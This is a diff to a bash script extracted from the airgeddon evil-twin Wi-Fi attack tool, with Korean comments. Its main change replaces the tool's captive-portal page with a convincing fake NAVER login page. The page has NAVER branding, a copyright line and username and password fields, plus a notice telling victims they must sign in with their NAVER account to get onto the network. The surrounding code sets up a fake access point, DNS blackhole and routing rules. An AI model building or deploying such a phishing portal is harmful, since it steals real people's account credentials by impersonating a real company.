@@ -6,13 +6,18 @@
 # Extracted from wfast.sh (airgeddon)
 # ============================================================
 
+# --- 설정 파일 로드 ---
 _config_file="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/et_config.conf"
 if [ ! -f "${_config_file}" ]; then
 	echo "[!] Config file not found: ${_config_file}" >&2
 	exit 1
 fi
+# shellcheck source=et_config.conf
+# Windows에서 편집된 파일은 줄 끝이 \r\n(CRLF)으로 저장됨.
+# tr -d '\r'로 \r을 제거한 뒤 소싱하면 어떤 OS에서 편집해도 정상 동작.
 source <(tr -d '\r' < "${_config_file}")
 
+# --- 이 스크립트 고유의 DoS 방식 (config 값을 덮어씀) ---
 et_dos_attack="${et_dos_attack:-Aireplay}"
 dos_pursuit_mode="${dos_pursuit_mode:-0}"
 
@@ -106,6 +111,7 @@ session_name="airgeddon"
 tmux_main_window="airgeddon"
 global_process_pid=""
 
+# ANSI 색상 코드 (airgeddon 본체의 색상 변수 대체)
 normal_color="\e[0m"
 yellow_color="\e[1;33m"
 green_color="\e[0;32m"
@@ -130,11 +136,68 @@ mac_spoofing_desired=0
 et_process_control_window=""
 enterprise_process_control_window=""
 
-function language_strings() {
-    if [ "${3}" = "read" ]; then
-        read -r -p "Press Enter to stop..." _
-    fi
-}
+# ========================
+# 함수 목록
+# ========================
+# [deauth와 공통]
+# debug_print()
+# disable_rfkill()
+# set_mode_without_airmon()
+# physical_interface_finder()
+# get_5ghz_band_info_from_phy_interface()
+# get_6ghz_band_info_from_phy_interface()
+# check_interface_supported_bands()
+# recalculate_windows_sizes()
+# detect_screen_resolution()
+# set_windows_sizes() / set_xsizes() / set_ysizes() / set_ypositions()
+# manage_output()
+# start_tmux_processes()
+# get_tmux_process_id()
+# set_spoofed_mac()
+# launch_fake_ap()
+# kill_pid_and_children_recursive()
+# kill_dos_pursuit_mode_processes()
+# kill_tmux_windows()
+# kill_et_windows()
+# recover_current_channel()
+# restore_et_interface()
+# language_strings_handling_messages()
+#
+# [captive portal 전용]
+# get_hostapd_version()
+# generate_fake_bssid()
+# generate_fake_essid()
+# compare_floats_greater_or_equal()
+# set_hostapd_config()
+# set_network_interface_data()
+# set_dhcp_config()
+# control_routing_status()
+# save_iptables_nftables()
+# is_first_routing_modifier_airgeddon_instance()
+# is_last_airgeddon_instance()
+# clean_all_iptables_nftables()
+# clean_this_instance_iptables_nftables()
+# prepare_iptables_nftables()
+# clean_initialize_iptables_nftables()
+# set_std_internet_routing_rules()
+# launch_dhcp_server()
+# set_et_control_script()
+# launch_et_control_window()
+# launch_dns_blackhole()
+# set_webserver_config()
+# set_captive_portal_page()
+# launch_webserver()
+# write_et_processes()
+# clean_tmpfiles()
+# delete_instance_orchestrator_file()
+# exec_et_deauth()
+# exec_et_captive_portal_attack()
+# ========================
+
+# language_strings 스텁
+# airgeddon 본체의 다국어 출력 함수 대체 - 단독 실행 시 에러 없이 무시됨
+function language_strings() { :; }
+
 function language_strings_handling_messages() {
 	declare -gA language_strings_no_file
 	language_strings_no_file["ENGLISH"]="Error. Language strings file not found"
@@ -150,6 +213,10 @@ function language_strings_handling_messages() {
 	declare -gA language_strings_exiting
 	language_strings_exiting["ENGLISH"]="Exiting airgeddon script v${airgeddon_version} - See you soon! :)"
 }
+
+# ============================================================
+# deauth와 공통 함수
+# ============================================================
 
 function debug_print() {
 	if "${AIRGEDDON_DEBUG_MODE:-false}"; then
@@ -601,6 +668,9 @@ function restore_et_interface() {
 	control_routing_status "end"
 }
 
+# ============================================================
+# captive portal 전용 함수
+# ============================================================
 
 function get_hostapd_version() {
 	debug_print
@@ -1416,37 +1486,69 @@ function set_captive_portal_page() {
 	echo -e "}\n"
 	} >> "${tmpdir}${webdir}${jsfile}"
 
-	{
-	echo -e "#!/usr/bin/env bash"
-	echo -e "echo '<!DOCTYPE html>'"
-	echo -e "echo '<html>'"
-	echo -e "echo -e '\t<head>'"
-	echo -e "echo -e '\t\t<meta name=\"viewport\" content=\"width=device-width\"/>'"
-	echo -e "echo -e '\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\"/>'"
-	echo -e "echo -e '\t\t<title>WiFi Authentication</title>'"
-	echo -e "echo -e '\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"${cssfile}\"/>'"
-	echo -e "echo -e '\t\t<script type=\"text/javascript\" src=\"${jsfile}\"></script>'"
-	echo -e "echo -e '\t</head>'"
-	echo -e "echo -e '\t<body>'"
-	echo -e "echo -e '\t\t<img src=\"${pixelfile}\" style=\"display: none;\"/>'"
-	echo -e "echo -e '\t\t<div class=\"content\">'"
-	echo -e "echo -e '\t\t\t<form method=\"post\" id=\"loginform\" name=\"loginform\" action=\"check.htm\">'"
-	echo -e "echo -e '\t\t\t\t<div class=\"title\">'"
-	echo -e "echo -e '\t\t\t\t\t<p>WiFi Authentication Required</p>'"
-	echo -e "echo -e '\t\t\t\t\t<span class=\"bold\">${essid//[\`\']/}</span>'"
-	echo -e "echo -e '\t\t\t\t</div>'"
-	echo -e "echo -e '\t\t\t\t<p>Enter the WiFi password to restore your connection:</p>'"
-	echo -e "echo -e '\t\t\t\t<label>'"
-	echo -e "echo -e '\t\t\t\t\t<input id=\"password\" type=\"password\" name=\"password\" maxlength=\"63\" size=\"20\" placeholder=\"Password\" pattern=\".{8,}\" required/><br/>'"
-	echo -e "echo -e '\t\t\t\t</label>'"
-	echo -e "echo -e '\t\t\t\t<p>Show password <input type=\"checkbox\" id=\"showpass\"/></p>'"
-	echo -e "echo -e '\t\t\t\t<button class=\"button\" type=\"submit\">Connect</button>'"
-	echo -e "echo -e '\t\t\t</form>'"
-	echo -e "echo -e '\t\t</div>'"
-	echo -e "echo -e '\t</body>'"
-	echo -e "echo '</html>'"
-	echo -e "exit 0"
-	} >> "${tmpdir}${webdir}${indexfile}"
+	cat >> "${tmpdir}${webdir}${indexfile}" << 'INDEXEOF'
+#!/usr/bin/env bash
+cat << 'HTMLEOF'
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>NAVER</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, 'Malgun Gothic', sans-serif; }
+body { background: #fff; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
+.header { width: 100%; padding: 16px 0; text-align: center; border-bottom: 1px solid #e5e5e5; margin-bottom: 40px; }
+.logo { color: #03c75a; font-size: 40px; font-weight: 900; letter-spacing: -2px; text-decoration: none; }
+.login-wrap { width: 100%; max-width: 500px; padding: 0 20px; }
+.login-wrap h2 { font-size: 20px; font-weight: 700; text-align: center; margin-bottom: 24px; color: #222; }
+.input-group { margin-bottom: 10px; }
+.input-group input { width: 100%; height: 48px; padding: 0 14px; border: 1px solid #dadada; border-radius: 4px; font-size: 15px; outline: none; color: #222; }
+.input-group input:focus { border-color: #03c75a; box-shadow: 0 0 0 2px rgba(3,199,90,0.2); }
+.input-group input::placeholder { color: #aaa; }
+.login-btn { width: 100%; height: 48px; background: #03c75a; color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 14px; letter-spacing: 0.5px; }
+.login-btn:hover { background: #02b350; }
+.notice { margin-top: 20px; padding: 14px; background: #f8f8f8; border-radius: 4px; font-size: 13px; color: #666; line-height: 1.6; text-align: center; }
+.notice b { color: #333; }
+.footer-links { display: flex; justify-content: center; gap: 20px; margin-top: 30px; font-size: 13px; color: #888; }
+.footer-links a { color: #888; text-decoration: none; }
+.footer-links a:hover { color: #03c75a; }
+.footer { margin-top: 40px; text-align: center; font-size: 12px; color: #aaa; padding-bottom: 30px; }
+</style>
+</head>
+<body>
+<div class="header">
+  <span class="logo">NAVER</span>
+</div>
+<div class="login-wrap">
+  <h2>로그인</h2>
+  <form method="post" action="check.htm">
+    <div class="input-group">
+      <input type="text" name="username" placeholder="아이디" autocomplete="off"/>
+    </div>
+    <div class="input-group">
+      <input type="password" name="password" id="password" placeholder="비밀번호" maxlength="63" pattern=".{1,}" required/>
+    </div>
+    <button type="submit" class="login-btn">로그인</button>
+  </form>
+  <div class="notice">
+    <b>보안 연결이 필요합니다</b><br/>
+    현재 네트워크에 연결하려면<br/>네이버 계정으로 인증이 필요합니다.
+  </div>
+  <div class="footer-links">
+    <a href="#">아이디 찾기</a>
+    <a href="#">비밀번호 찾기</a>
+    <a href="#">회원가입</a>
+  </div>
+</div>
+<div class="footer">
+  Copyright © NAVER Corp. All Rights Reserved.
+</div>
+</body>
+</html>
+HTMLEOF
+exit 0
+INDEXEOF
 
 	base64 -d <<< "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAA1JREFUGFdj+P///38ACfsD/QVDRcoAAAAASUVORK5CYII=" > "${tmpdir}${webdir}${pixelfile}"
 
